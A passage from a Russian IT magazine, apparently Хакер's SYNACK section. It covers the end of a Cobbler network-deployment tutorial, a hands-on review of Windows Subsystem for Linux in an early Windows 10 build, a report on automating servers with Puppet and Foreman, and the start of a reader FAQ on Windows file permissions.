    --path=/media/iso

Плюс такого способа в том, что импортируется абсолютно вся связанная ин-
формация, в том числе и данные о пакетах.





                                                    Импортируем дистрибутив

Кроме указанных, есть еще множество разных параметров, подробнее о них
в документации. По окончании будет выполнено еще три шага: добавление
дистрибутива, в процессе которого создаются профили, создание ассоциа-
ции с репозиторием и kickstart-файлом. После добавления дистрибутива он
будет показан в веб-консоли или в списке команды cobbler:

$ sudo cobbler distro list
$ sudo cobbler profile list
$ sudo cobbler report --name=Ubuntu16_04

Если список пустой, выполните cobbler sync. Удалить так же просто:

$ sudo cobbler distro remove --name=Ubuntu16_04

Второй вариант создания дистрибутива — использование команды cobbler
distro. Обычно в ней необходимости нет, но только таким способом добав-
ляются Windows-системы. В этом случае указывается путь к ядру и initrd:

$ sudo cobbler distro add --name=string --kernel=path
    --initrd=path [--kopts=string] [--kopts-post=string]
    [--ksmeta=string] [--arch=x86|x86_64|ia64]
    [--breed=redhat|debian|suse] [--template-files=string]

В  kopts  задаем  параметры  (например,  --kopts="priority=critical
locale=ru_RU"), ksmeta позволяет менять установки в kickstart-файле, breed
указывает на тип дистрибутива.

УСТАНОВКА РЕПОЗИТОРИЕВ
При импорте ISO Cobbler не создает репозиторий, поэтому все пакеты, кото-
рые на нем имеются, будут доступны при установке только этого дистрибутива.
Репозитории, образованные при импорте с DVD, можно просмотреть и через
веб: https://cobbler_ip/cobbler/ks_mirror, но они не подключены. Поэ-
тому следующий обязательный шаг — это подключение репозитория:

$ sudo cobbler repo add --name=local-xenial --mirror=
    http://archive.ubuntu.com/ubuntu/ --breed=apt --arch=x86_64
    --apt-components=main,restricted,universe,multiverse
    --apt-dists=xenial,xenial-updates,xenial-security

Смотрим список репозиториев:

$ sudo cobbler repo list

Добавим файлы с DVD, только отключим зеркалирование, чтобы не дублиро-
вать данные:

$ sudo cobbler repo add --name=Ubuntu16_04_DVD_base --mirror=
    https://cobbler_ip/cobbler/ks_mirror/Ubuntu16_04/
    --keep-updated=N --mirror-locally=0 --arch=x86_64

Если планируется обновление большого количества систем, следует создать
локальную копию репозиториев:

$ sudo cobbler sync
$ sudo cobbler reposync

Подобные команды необходимо запускать перед каждой установкой систем
или поручить это cron. Файлы будут копироваться в /var/www/cobbler/repo_
mirror, дисковый раздел должен иметь достаточно места.

НАСТРАИВАЕМ ПРОФИЛЬ И СОЗДАЕМ СИСТЕМУ
В профиле описываются все параметры, используемые во время развертыва-
ния системы, и выделение ресурсов. Посмотреть список и параметры можно,
введя команды

$ sudo cobbler profile list
$ sudo cobbler profile report --name=Ubuntu16_04





                                                            Настройка профиля


Профили можно копировать, переименовывать и редактировать:

$ sudo cobbler profile copy --name=Ubuntu16_04 --newname=Ubuntu-server

Теперь достаточно указать отличия для нового профиля — например, свой
kickstart-файл:

$ sudo cobbler profile edit --name=Ubuntu-server --kickstart=
    /var/lib/cobbler/kickstarts/sample.seed --repos="local-xenial"

Eсли в settings параметр yum_post_install_mirror установлен в 1 (по
умолчанию), репозитории будут доступны в системе и после ее установки.
  На данный момент уже можно запускать клиентскую машину. В процессе
PXE-загрузки будет выведено меню, по ходу установки ОС могут быть запро-
шены некоторые настройки.
  Еще один вариант — сразу «создать» систему, в которой указать профиль
и требуемые параметры, в этом случае установка производится автоматиче-
ски. Параметров можно задать много, не все они обязательны:

$ sudo cobbler system add --name=SRV01 --profile=Ubuntu16_04
    --kopts="interface=eth0" --hostname=example.com --interface=eth0
    --ip=192.168.1.2 --subnet=255.255.255.0 --gateway=192.168.1.1
    --name-servers=8.8.8.8 8.8.4.4 --mac=11.22.33.44.55

Параметры --ip= и --hostname= перенастраивают DHCP-сервер, управ-
ляемый Cobbler, который после cobbler  sync выдаст клиенту его IP-адрес.
Для новой системы также будет создан отдельный конфигурационный файл
(имя соответствует МАС-адресу) в каталоге /var/lib/tftpboot/pxelinux.
cfg, он выводит меню для этого компьютера. Все, кто не описан как система,
будут получать файл default.
   Отредактировать параметры системы можно при помощи команды cobbler
system edit. Другие ключи позволят просмотреть список и получить отчет:

$ sudo cobbler system list
$ sudo cobbler system report --name=SRV01





                                        Добавляем систему через веб-интерфейс

Иногда какой-то компьютер не может быть развернут по сети, например BIOS
не поддерживает такую функцию. В этом случае Cobbler предлагает возмож-
ность создания ISO-образа, который обеспечивает загрузку и/или установку
систем. За создание образа отвечает команда cobbler buildiso. Без допол-
нительных параметров в него будут занесены все ядра и initrd-файлы, извест-
ные Cobbler, и сгенерировано меню. После загрузки компьютера все фай-
лы затем получаются с сервера Cobbler. Также можно сгенерировать образ
конкретной системы, дистрибутива или профиля, а если добавить параметр
--standalone, будут добавлены и все файлы, необходимые для развертыва-
ния без доступа к Cobbler:

$ sudo cobbler distro list
$ sudo cobbler buildiso --distro=Ubuntu16_04 --standalone


ВЫВОД
Это только основные возможности Cobbler, но достаточные, чтобы начать ра-
боту. Интеграция с Puppet и Func даст в руки еще более гибкий инструмент
по развертыванию ОС.
SYNACK





             WINDOWS SUBSYSTEM
             FOR LINUX
               КАК ОНО ЕСТЬWINE





                                                                               Артём Зорин
                                                                                                  temazorin@hotmail.comНАОБОРОТ



Никогда прежде корпорация Microsoft не обращала
столь пристального внимания на Linux, как в последние
полгода. Конкретно сборка Microsoft Windows 10 Build
14316 для разработчиков (developer release) совместно
с Canonical (!) включает подсистему Linux. Это не эмулятор
и не виртуальная машина, а полноценный терминал Linux,
работающий внутри Windows 10, — Wine наоборот!

КАК ЭТО ПОНИМАТЬ?
30 марта 2016 года на конференции Build для разработчиков Microsoft объя-
вила о начале поддержки командного интерпретатора bash в Windows 10. Да-
стин Киркленд (Dustin Kirkland) из команды разработчиков Ubuntu в своем бло-
ге раскрыл некоторые подробности этого знакового события. Вкратце работа
линуксовых приложений организуется без использования контейнеров вирту-
ализации, отдельной пересборки утилит и даже без использования ядра
Linux — родные исполняемые файлы Linux запускаются благодаря специаль-
ной прослойке, на лету транслирующей системные вызовы Linux в системные
вызовы Windows. По сути, реализован обратный аналог системы Wine, полу-
чивший название Windows Subsystem for Linux (далее — WSL) и якобы практи-
чески не влияющий на производительность выполняемых приложений Linux.
   Установка этого чуда — не самая тривиальная задача.
Для начала нужно установить сборку Windows 10 14316 —
экспериментальную версию Windows 10 для разработчи-
ков и участников программы Windows Insider. Установить
сборку можно, обновившись до нее из самой Windows.
При этом нужно быть участником программы Windows                                                         INFO
Insider и не забыть включить в настройках «десятки» по-
лучение экспериментальных сборок. Также есть вари-        Важно! WSL
ант скачать готовый ISO-образ c торрентов. Этот вариант       устанавливается
                                                                         и работает толькона первый взгляд выглядит незаконным, однако это не так.                                                                              в 64-битных версиях
Экспериментальные сборки Windows 10 распространяют-          Windows.
ся бесплатно для всех (прямо как Linux!).
   Летом Microsoft обещает выпустить большое обновление для Windows 10
всех версий, которое по умолчанию будет включать WSL. После установки
Windows 10 Build 14316 необходимо установить специальный образ Ubuntu,
доступный из Microsoft Store. Установив данный пакет, пользователь Windows
10 сможет через меню «Пуск» вызвать командную оболочку cmd.exe, запустить
в ней bash и получить штатный интерфейс командной строки Ubuntu. Пользо-
вателю доступны apt, ssh, rsync, find, grep, awk, sed, sort, xargs,
md5sum, gpg, curl, wget, apache, mysql, redis, python, perl, ruby,
php, gcc, tar, vim, emacs, diff, patch и большинство бинарных па-
кетов из архива Ubuntu, содержащих консольные и серверные приложения.
При этом некоторые приложения пока остаются неработоспособными, на-
пример из-за неполной эмуляции терминала VT100 невозможно использовать
byobu, screen и tmux.
   Приложения Ubuntu выполняются в отдельном представлении файловой
системы, повторяющей организацию файловой иерархии в Linux. Файловые
системы Windows доступны на запись в форме разделов, примонтированных
в папке /mnt. Например, папка C:\Users\Kirkland\Downloads доступна как /
mnt/c/Users/Kirkland/Downloads.
   Для Windows-приложений корневая файловая система Ubuntu видна
как C:\Users\Kirkland\AppData\Local\Lxss\rootfs\. Для установки до-
полнительных пакетов и обновления системы применяется инструментарий
apt с загрузкой штатных пакетов и обновлений из репозиториев Ubuntu. Код
прослойки пока остается закрытым (имеется в виду именно код прослойки,
а не код Ubuntu, конечно).
  WSL создавалась как проект, независимый от конкретных дистрибутивов
Linux. Ubuntu выбран для поставки в первой версии как наиболее популярный
дистрибутив в среде разработчиков, и нет существенных технических причин
(кроме полной и точной реализации системных вызовов), которые помешали
бы поддержке пользовательских окружений других дистрибутивов в будущем,
утверждают в Microsoft. Для WSL в ядре Windows была специально реализова-
на поддержка fork() и некоторых других специфичных системных вызовов
POSIX и Linux, что позволило добиться реализации более эффективной, чем
при использовании эмуляции. Также в WSL удалось полностью избавиться
от использования ядра Linux: по сути, пользовательское окружение Ubuntu ра-
ботает поверх ядра Windows, так же как в Nexenta OS пользовательское окру-
жение Ubuntu работает поверх ядра OpenSolaris.
  WSL не базируются на ранее доступной подсистеме POSIX (SUA), которая
в NT 3.5.1 содержала лишь минимальный набор системных вызовов и позд-
нее была заменена на систему Services for UNIX (SFU), основанную на нара-
ботках Interix. WSL является полностью новой реализацией, не требующей
перекомпиляции программ или сборки специальных дистрибутивов. В WSL
подготовлена новая инфраструктура ядра Windows, кото-
рая предоставляет слой совместимости с Linux syscall API
и специальный загрузчик, что позволяет напрямую запускать
уже поставляемые в Ubuntu немодифицированные испол-
няемые файлы, так же как запускаются обычные программы
для Windows. По сути, речь идет о новом поколении интегра-
                                    WWWции различных ОС друг с другом.
   Поддержка графических приложений не планируется. Си-     Вся последняя
стема может запускать серверные приложения, но рассчита-     и проверенная
                                                                         информацияна скорее на их тестирование, чем на развертывание замены                                                                             о Windows 10
Linux-серверов для промышленного применения. Проект на-                                                                                                    Insider Preview
целен только на предоставление инструментария командной      из первых рук
строки для разработчиков.





                                            Ubuntu Bash в Windows 10 во всей красе


НЕМНОГО ОБ УСТАНОВКЕ
Автор статьи устанавливал WSL в несколько этапов: вначале установленная на его
ноутбуке Dell Inspiron «семерка» была обновлена до Windows 10. Это заняло око-
ло семи часов (не считая времени на загрузку образа с сервера Microsoft). По-
сле чего начался увлекательный процесс установки последней тестовой сбор-
ки Windows 10 Build 14316. Дело в том, что автор никогда не был бета-тестером
Windows 10 и из-за этого не мог участвовать в программе Windows Insider. Не-
долго думая, зарегистрировавшись на сайте для бета-тестеров, он попробовал
обновиться. Не тут-то было! Система просто не видела того, что он участвует
в тестировании. К тому же ни одно обновление Windows 10
не устанавливалось. После целого дня мучений было при-
нято решение скачать и установить образ тестовой версии
«десятки» с нуля. Но и тут ждал неприятный сюрприз: кор-
порация Microsoft распространяет образы своих экспери-
ментальных сборок в виде не обычных ISO-файлов, а фай-
лов нового формата, созданного самой же Microsoft, — ESD        INFO
(Electronic  Software  Distribution). Название говорит само
                                                                          Если хочешь, чтобы
за себя. После скачивания файлов данного типа их необ-                                                             WSL заработал,
ходимо конвертировать в более привычный формат ISO.        необходимо
Для этого Microsoft выпустила специальную утилиту, кото-         установить
                                                                             английский языковойрая называется ESD Decrypter. Подробнее об этом интерес-                                                                                 пакет для системы,
ном процессе можешь почитать тут. Спустя два часа после       а также выбрать
начала конвертирования ESD-файла ISO-образ был успеш-         английский
                                                                                в качестве языкано создан и записан с помощью утилиты WinSetupFromUSB
                                                                         по умолчанию. Иначе
на флешку. Установка прошла без проблем, и наконец у ав-                                                            WSL установится,
тора была Windows 10 Build 14316.                                    но не запустится!





                                             Скачивание Ubuntu из Windows Store

Далее активируешь доступную для участников Windows Insider функцию установ-
ки расширенных обновлений System Settings    Advanced Windows Update.





                                                  Включение Windows Insider

Переводишь систему на максимальный уровень оперативности доставки новых
обновлений (the fast ring), переместив ползунок в крайне правое положение.





                                            Нам нужна только свежатинка!


Включаешь режим разработчика (developer mode).





                                                          Теперь мы разработчики


Инициируешь проверку наличия обновлений, устанавливаешь все доступные
обновления и перезагружаешь систему.





                                        Установка обновлений займет много времени

После перезагрузки включаешь опцию Windows  Subsystem  for  Linux
(Beta). Для этого на панели задач Windows нажимаешь кнопку поиска и вво-
дишь windows features.
   Второй раз перезагружаешь систему. В меню Stаrt набираешь bash, вы-
полняешь bash.exe, соглашаешься с правилами использования сервиса,
ждешь окончания загрузки компонентов Ubuntu и получаешь традиционное
приглашение командной строки Ubuntu с большинством основных утилит.





                                                             Linux в Windows — это
                                                       не баг, это фича
                   Linux в Windows — это не баг, это фича





                                                 Linux в Windows — это не баг, это фича





                                                 Linux в Windows — это не баг, это фича

Для  использования   тра-
диционного   для   Ubuntu
шрифта  в консоли  загру-
жаешь шрифт с сайта, из-
влекаешь   из   zip-архива
UbuntuMono-R.ttf и устанав-
ливаешь его через двойной
клик в проводнике. Далее
меняешь настройки в рее-
стре, установив параметр
   H K E Y _ L O C A L _
M A C H I N E \ S O F T W A R E \
Microsoft\WindowsNT\
CurrentVersion\Console\
TrueTypeFont  в  значение
Ubuntu  Mono. В настройках
консоли выбираем шрифт
Ubuntu.
   P. S. Проделав все опи-
санное,  можешь  вернуть
русский язык как основной
в системе.
                                  Шрифт Ubuntu выглядит более привычным
                                       и красивым, чем Lucidia Console

КАК ЭТО РАБОТАЕТ?
Спойлер: пока не очень хорошо и тормозит.
   Как уже говорилось ранее, для запуска WSL после установки необходимо
запустить консоль Windows — cmd, набрать bash, и перед тобой откроется при-
вычный терминал Linux. Однако автор этой статьи заметил, что скорость рабо-
ты приложений Linux несколько ниже, чем приложений Windows. Из пользова-
тельских программ установились и запустились Midnight
Commander, Finch (форк Pidgin, использующий в работе
библиотеку ncurses), top и htop. Уровень торможения рос
прямо пропорционально сложности приложения. Можно
с уверенностью сказать, что WSL пока не готов для по-
вседневного использования даже разработчиками. Это,
скорее, экспериментальное нечто, позволяющее опро-     WARNING
бовать возможности bash в Windows. К тому же после не-
                                                                         Важно! Все действия
скольких дней активного использования WSL приказала                                                                            в WSL выполняются ис-
долго жить — попросту не запускалась или начинала дико     ключительно от рута!
тормозить всю систему.
   Решение было найдено в интернете. Чтобы переустановить/сбросить/уда-
лить WSL, нужно в терминале Windows (cmd) ввести всего две команды:

# lxrun /uninstall /full -- полностью удаляет WSL
# lxrun /install -- устанавливает WSL заново





                     Удаление и дальнейшая переустановка занимают около получаса

Автору было интересно, насколько быстро и корректно проходят всевозмож-
ные линуксовые тесты.

ПРОВЕРКА НА ВШИВОСТЬ
Итак, тесты. Большинство тестов, использованных автором, были взяты с сай-
та Arch Linux.
  Первым бенчмарком, призванным проверить скорость работы WSL, дол-
жен был стать interbench, но он не установился, поскольку его нет в репозито-
риях Ubuntu. Поэтому таковым стала HardInfo — утилита, показывающая всю
исчерпывающую информацию об аппаратной составляющей ПК. В целом тест
проходит нормально, без проблем. Но очень медленно.





                                                                        HardInfo в деле

Вторым планировался UnixBench. Однако и он не пошел. Выдал ошибку.
Остальные бенчмарки также благополучно не запустились.
   Поэтому автор сосредоточился на установке и тестировании консольных
приложений Linux. Первым был запущен и установлен Finch — консольный
аналог Pidgin на основе библиотеки ncurses. Приложение на удивление бы-
стро и без проблем установилось и запустилось. Удалось даже настроить под-
ключение к сети ICQ и пообщаться с парой человек из числа тех, кто до сих
пор использует «аську». Единственная проблема в том, что WSL пока не под-
держивает кириллические шрифты. Точнее, ввод на кириллице. Поэтому при-
шлось набирать текст на транслите. Добро пожаловать в 1996 год!





                                                     Так выглядит Finch для Windows

Следующим был протестирован бессмертный Midnight Commander. Этот
представитель линуксовых консольных приложений, тоже созданный на осно-
ве библиотеки ncurses, установился также без проблем. И работал. Но очень,
очень, очень медленно. Операции копирования-перемещения выполнялись
по полчаса на файл размером 200 Мбайт (видео). Интерфейс был жутко неот-
зывчивым. Хочется верить, что это всего лишь баги тестовой версии и к полно-
ценному релизу все будет исправлено.





                                             Старый добрый Midnight Commander

Остальные утилиты работали более-менее сносно. А благодаря хорошему фид-
бэку Microsoft поиск и устранение багов идет гораздо быстрее, чем раньше. Поч-
ти все штатные утилиты Linux, вроде time или cal, работают исправно, но тоже
с еле заметным торможением. Все же это не полноценная среда Linux. Было бы
неплохо увидеть поддержку графики, но этого, к сожалению, не планируется.

Предыдущие попытки внедрить Linux в Windows

А что же было до Windows Subsystem for Linux? Ответ: были попытки внедрить
прослойку Linux в среду Windows — с переменным успехом на протяжении уже
21 года. Самая знаменитая, безусловно, Cygwin — UNIX-подобная среда и ин-
терфейс командной строки для Microsoft Windows. Cygwin обеспечивает тесную
интеграцию приложений, данных и ресурсов Windows с приложениями, данными
и ресурсами UNIX-подобной среды. Из среды Cygwin можно запускать обычные
приложения Linux, также можно использовать инструменты Cygwin из Windows.
Однако в отличие от WSL это, скорее, все же эмуляция или даже песочница
для кода. А не прослойка, транслирующая системные вызовы Windows и Linux.
   Изначально Cygwin разрабатывала компания Cygnus Solutions, которую
позднее приобрела Red Hat. Это свободное ПО, опубликованное под GNU
General Public License версии 2. В настоящее время Cygwin разрабатывается
сотрудниками Red Hat, NetApp и множеством добровольцев. Подобные функ-
циональные возможности предлагала также и Microsoft в своем пакете Services
for UNIX, включающем в себя подсистему Interix, и Subsystem for UNIX-based
Applications (в более новых версиях).
   Cygwin  представляет собой  инструмент для портирования ПО UNIX
в Windows и библиотеку, которая реализует интерфейс прикладного програм-
мирования POSIX на основе системных вызовов Win32. Кроме того, Cygwin
включает в себя инструменты разработки GNU для выполнения основных за-
дач программирования, а также и некоторые прикладные программы, эквива-
лентные базовым программам UNIX. В 2001 году в Cygwin был включен пакет
X Window System. Кроме того, Cygwin содержит библиотеку MinGW, позволя-
ющую работать с библиотекой Microsoft MSVCRT (Windows API); библиотека
MinGW менее требовательна к объему оперативной и дисковой памяти, рас-
пространяется под более свободной лицензией и может работать с любым
программным обеспечением, но функциональные возможности специфика-
ции POSIX реализованы в ней не так полно, как в Cygwin.
   Работа над проектом Cygwin была начата в 1995 году Стивом Чемберле-
ном (Steve Chamberlain), программистом Cygnus, заметившим, что Windows
NT и Windows 95 используют в качестве формата объектных файлов формат
COFF. К тому времени в GNU уже была реализована поддержка архитекту-
ры x86, COFF, а также библиотека языка C newlib; таким образом, по крайней
мере теоретически, не представляло затруднений получить из GCC кросс-ком-
пилятор, который бы создавал исполняемые файлы Windows. Это оказалось
несложным и на практике. Вскоре появился прототип.
  Следующий шаг — заставить компилятор работать в Windows, но для этого
была необходима эмуляция многих функций UNIX: к примеру, должен работать
скрипт GNU configure. Этот скрипт нуждается в оболочке типа bash, которая,
в свою очередь, требует наличия стандартных потоков ввода-вывода и систем-
ного вызова fork. Windows располагает подобными функциональными возможно-
стями, и библиотека Cygwin лишь транслирует вызовы, исходящие от программ,
управляя определенными видами данных, такими как файловые дескрипторы.
  В 1996 году к проекту Cygwin присоединились и другие программисты, так
как стало очевидным, что Cygwin сделает возможным использование инстру-
ментов Cygnus на системах с Windows (до этого намечалось использовать
DJGPP). Этот вариант был особенно привлекательным, ведь кросс-компиля-
ция могла бы производиться в трех направлениях: можно было использовать
мощную станцию Sun для сборки Windows-кросс-компилятора MIPS, что по-
зволяло значительно экономить время. С 1998 года Cygnus предлагает пакет
Cygwin в качестве самостоятельного продукта.
   Стоит заметить, что наработки Cygwin были бы весьма полезны разработ-
чикам WSL. К примеру, для включения поддержки графического режима.


ИТОГ
Через неделю мучений и экспериментов автор статьи получил наполовину ра-
ботоспособное окружение Linux прямо поверх Windows 10. Что тут можно ска-
зать? Идея очень даже хорошая. Простому смертному пользователю оно, может
быть, и ни к чему, а вот разработчики, при условии, что задумка будет доведена
до ума, действительно смогут получить новый мощный инструмент для работы.
Ждем с нетерпением, когда выйдет первый релиз Microsoft GNU/Linux.
SYNACK
РАБОТА, РАБОТА,
ПЕРЕЙДИ НА PUPPET
             ИСТОРИЯ ИСПОЛЬЗОВАНИЯ
              PUPPET + FOREMAN





Быстрое развитие виртуализации вместе с по-
явлением пары серверов, одного нового и од-
ного старого, привели к росту числа серверов,
нуждающихся в управлении и обслуживании,                                                                              Александр «Plus» Рак
                                                                                              plus@omsklug.comв офисах организации и ее дочерних подраз-                                                                                               Участник сообщества
                                                                                  OmskLUG. Руководительделениях. И например, если раньше подключе-                                                                                          группы автоматизации
                                                                                            отдела ИТ департаментание к серверу мониторинга занимало немного                                                                                                  образования,
                                                                                              город Салехардвремени, то сейчас на это уйдет куда больше.
На этом этапе и необходимо обратиться за по-
мощью к средствам управления конфигурациями серверов.
В основном серверы, которые необходимо администриро-
вать, однотипны и имеют идентичный базовый набор про-
граммного обеспечения. Также они расположены на систе-
мах виртуализации. Иногда могут быть отличия, например
в версиях операционных систем. В любом случае один раз
выполнить указания системного администратора в дальней-
шем значительно сэкономит время решения тех или иных за-
дач. Это единственный выход в постоянно растущих инфра-
структурах.

С ЧЕГО НАЧАЛОСЬ
Сначала поднялся сервер виртуализации, затем внутрипочтовый сервер,
веб-хостинг, сервер мониторинга, DNS-сервер, сервер Jabber + площадка ве-
бинаров и многие другие. Затем настал момент, когда количество серверов
удвоилось, и их все нужно было подключить к мониторингу, поставить базовый
софт, в общем — выполнить базовые задачи.
   Выбирать стали между aNimble и Puppet. Последний покорил своей про-
стотой. Поскольку его установка очень хорошо описана на многих ресурсах,
опустим ее. После установки сервера и настройки первого клиента встал во-
прос, как за всем этим наблюдать. Желательно что-то визуальное. Тут рассма-
тривали только два варианта: Dashboard-Lite и Enterprise Dashboard. Первый
бесплатен, в нем можно только наблюдать и делить списки на группы для ви-
зуального восприятия. Группировать серверы на классы и применять на лету
так и не вышло, зато в консоли все прекрасно отрабатывало. После поставили
enterprise-версию, думая даже приобрести лицензию, чтобы облегчить жизнь
администраторам. Покрутив демоверсию (30 дней), поплевались: возможно-
сти пошире, чем у lite, но тем не менее не обеспечивают всего необходимого.
Тогда решили оставить lite и делать все консольно.
   Подключили все серверы, описали классы. Все завелось хорошо. На пер-
вых порах цели были простые:

•  указать содержимое файла /etc/resolf.conf с адресами DNS-сервера;
•  установить ряд программ: htop, iftop, Nmap;
•  установить пакеты Zabbix, настроить конфиг;
•  управлять обновлениями.

  И тут, очередной раз блуждая по интернетам, наткнулся на Foreman. По опи-
санию в статье установка была проста. В этой статье есть скрипт запуска кли-
ентов с настройкой конфига. Поскольку у нас серверы «разномастные» — есть
с Ubuntu 12.04 и 14.04, а статья ориентирована на 14.04, тут я наступил на пер-
вые грабли. Убрал установку репозиториев, стал использовать на 12.04 клиент
из собственных репозиториев. В итоге получился вот такой первый скрипт.





Как видно, скрипт устанавливает клиент Puppet, включает на запуск его, до-
бавляет параметр «адрес сервера» в конфиг и запускает агент. В Foreman он
появился, и все было прекрасно до того момента, пока не стали обрабаты-
ваться классы. Это были вторые грабли. Дело в том, что с Foreman устанавли-
вается свой Puppet. И вся эта конструкция требует определенной структурной
иерархии в манифестах. Например, при дефолтном Puppet использовалось
три файла манифеста: sipe.pp — дефолтный, node.pp — файл с описанием
нодов и class.pp, в котором описывались классы. У Foreman из коробки до-
ступно четыре окружения, так называемые глобальные профили для групп сер-
веров. Например, для тестовых и для продакшена. Чтобы манифест был до-
ступен в любом окружении, его необходимо добавлять в каждое окружение.
Имя манифеста при этом всегда должно быть unit.pp, для корректной обра-
ботки Foreman. В итоге каждый класс должен быть «оформлен» /etc/puppet/
environments/production/modules/class_name/manifests и внутри должен
лежать файл init.pp — только с таким именем и никаким другим. При исполь-
зовании «старых» манифестов, где все в куче, сыпались ошибки. Причем у меня
не вышло без ошибок запихать два класса в один init.pp. Как только с этим
разобрались и переписали манифесты, можно подключать их в веб-интерфей-
се Foreman. Настройка подключений также очень хорошо изложена в статье,
ссылку на которую я дал выше. Что мне понравилось: очень удобное управле-
ние группами серверов с предустановкой классов (то есть можно создавать
группы и подгруппы и на каждом из уровней прикреплять классы); удобный об-
зор и мониторинг. Позже, когда все заработало и появилось больше времени,
я занялся небольшой модификацией скрипта установки Puppet-клиента.
   Далее неплохо бы дать инструмент, который бы автоматически или полу-
автоматически устанавливал и настраивал Puppet-агент в систему. Да еще
и с проверкой дистрибутива, в котором он работает. А в идеале вообще про-
граммой на C и с поддержкой различных дистрибутивов GNU/Linux.

НАЧНЕМ С МАЛОГО
Итак, начнем с небольшого скрипта на bash. Вдруг это вдохновит кого-нибудь
на написание «супер» программы инсталлятора, а пока я наваял на коленке
скрипт только для Ubuntu. За помощь огромнейшее спасибо одному из участ-
ников Omsk Linux User Group — Shroom.

Мысли вслух

Народ из сообщества OmskLUG очень дружелюбен и всегда готов помочь.
Адрес Jabber-конференции: omsklug@conference.jabber.ru.



Придется вспомнить, как писать на bash (или научиться). А поскольку я человек
далекий от написания скриптов на bash, то у меня дело подзатянулось. Что-
бы снять вопросы, которые возникнут позднее, сразу оговорюсь, что на мо-
мент написания статьи было две версии Ubuntu: 12.04 и 14.04. Итак, обо всем
по порядку.





Здесь мы запускаем сценарий установки, соглашаемся с запуском скрипта
или отменяем его. Затем запускаем второе окно с указанием имени компью-
тера в файле /etc/hostname для возможности смены имени хоста. Делается
это из-за того, что имя сертификата для Puppet и имя хоста совпадают. А так
как планируется запускать скрипт сразу после установки системы, то очень ак-
туально сменить hostname компьютера.
   Получаем введенное значение, проверяем, что не нажали отмену, пишем
данные в /etc/hostname. Если отмена — выходим.





Запускаем установку Puppet-клиента. Опять проверяем, что нажато — ОK или
отмена, и проверяем версию установленной системы. Если 12.04 — качаем
пакет с puppetlabs. Устанавливаем его, удаляем deb-пакет с компьютера, за-
пускаем установку Puppet-агента. Даем разрешение на запуск. Пишем в файл
/etc/puppet/puppet.conf адрес Puppet-сервера, указанный ранее, и пере-
запускаем Puppet-агент. Если нет — качаем для 14.04 и повторяем те же шаги,
что и для 12.04 (если кто напишет проверку для всех систем — с удовольстви-
ем бы применил у себя). Для удобства добавляем команду puppetagent. И при-
меняем файл .bashrc.





Это немного ускорит установку и настройку Puppet-клиента. Как известно, ап-
петит приходит во время еды. Вот и в моем случае: только когда скрипт был
дописан, пришла идея внести изменения — не проверять установленную ОС,
а давать выбор пользователю самому указать версию Linux, в которой запуска-
ется скрипт. И украсить прогресс-баром скачивание и установку Puppet с по-
мощью whiptail --gauge или аналогичного инструмента dialog. Побродив
несколько дней по интернетам, наткнулся на занимательную статью «Приме-
нение whiptail --gauge».
   Суть скрипта, приведенного в статье, в следующем: пока запущен процесс,
идет эмуляция его пересчета. Когда процесс завершается, прогресс-бар
устанавливается в 100% и после закрывается. Не совсем честно, но результат
такой, какой нужно. После небольшой правки этот кусок выглядел следующим
образом. Для украшения и, что называется, отвода глаз самое то.





Как видно, немного допилил прогресс-бар — чтобы он боле-
е-менее был похож на настоящий прогресс-бар, а не имита-
цию. После этого получили вполне рабочую систему. Теперь
все это хозяйство необходимо добавить в процесс установ-
ки системы. Системы мы ставим по сети PXE, скрипт автона-
стройки выложен на веб-сервере (о том, как это поднима-
лось, можно прочитать в серии статей по PXE в предыдущих    WWW
номерах) preseed.cfg. Внутри описаны различные директи-
                                                                     Пример настрой-вы автонастройки по ходу установки, так называемые файлы                                                                                 ки preseed.cfg
ответов. Здесь можно указать, какой набор программного
обеспечения дополнительно нужно установить, как разбить
диски, как настроить сеть и прочее.
   Нас интересует директива d-i preseed/late_command string. Для удоб-
ства положим скрипт рядом с файлом preseed.cfg на веб-сервере и потом ска-
чаем его в процессе установки.





Если на этом этапе использовать скрипт, то его нужно немного переработать.
А именно убрать запуск клиента Puppet, оставить только установку пакетов.
Рекомендую использовать после первой загрузки сервера. Я пошел немно-
го по другому пути: по d-i preseed/late_command string просто скачиваю
файл скрипта в систему, а уже после перезагрузки запускаю его.
   Далее готовим Puppet-манифесты. Описываем классы установки базово-
го пакета программ и подключение к системе мониторинга Zabbix. Внутри по-
следнего класса (zabbix) описываем файл конфигурации, который будем пе-
редавать Puppet-клиентам (смотри дополнительные материалы к статье).
   Теперь на все новые серверы автоматом будет вставать Puppet. В файле
настройки класса zabbix указано установить Zabbix-клиент, описан стандарт-
ный конфиг с указанием IP-адреса сервера Zabbix и дополнительно приведе-
ны параметры для подключения мониторинга температуры дисков:



В остальном все стандартно. Аналогичным образом настраиваем /etc/
resolg.conf для указания DNS-сервера. Класс routelan.pp используем для на-
стройки маршрутов, внутри описан скрипт, который создается в /opt/lan.sh.



Суть, думаю, понятна. Хочется отметить, что Foreman как оболочка мониторин-
га и инструмент подключения/отключения параметров (классов) показывает
себя очень даже неплохо. В сравнении с Puppet Dashboard информативность
на уровне.





                                                        Главная страница Foreman





                                                Список клиентов Puppet в Foreman





                                                   Центр сертификации Puppet

ЗАКЛЮЧЕНИЕ
Как показывает практика, подобные решения автоматизации высвобождают
от 30 до 50% времени, что дает значительное увеличение производительно-
сти системного администратора. В целом Puppet — очень зрелый продукт, ко-
торый без особых сложностей разворачивается практически на любой плат-
форме.
   P.S. Надеюсь, ты не потратил время зря ;) Спасибо и удачи!
FAQ



                                         Алексей Zemond
                                            Панкратов
                                            3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)





УСТРАНЯЕМ ПРОБЛЕМУ НАСЛЕДОВАНИЯ ПРАВ НА ФАЙЛ ОТ РОДИТЕЛЬ-
СКОЙ ПАПКИ В WINDOWS
У многих начинающих админов возникает подобная ситуация: на папку уста-
новлены права, которые наследуются всеми файлами в ней, после назначе-
ния других прав какому-то из файлов они сохраняются до первого изменения,
а затем родительские права восстанавливаются. Как сделать так, чтобы этого
не происходило?
   Такой вопрос встречается даже в сертификационных экзаменах по техно-
логиям Microsoft. Решается проблема следующим образом. Скажем, у нас есть
один пользователь, которому нужно только читать файл, и второй пользова-
тель, которому нужно читать и писать. В Active Directory делаем две секьюри-
ти-группы. Первая — для прав «только чтение», другая — с правами на запись.
Пользователей привязываем к соответствующим группам. После этого в ACL
(Access Control Lists) необходимой папки указываем нужные права доступа
для этих групп.
   После этих действий все будет работать, как и было задумано. Увы, по-дру-
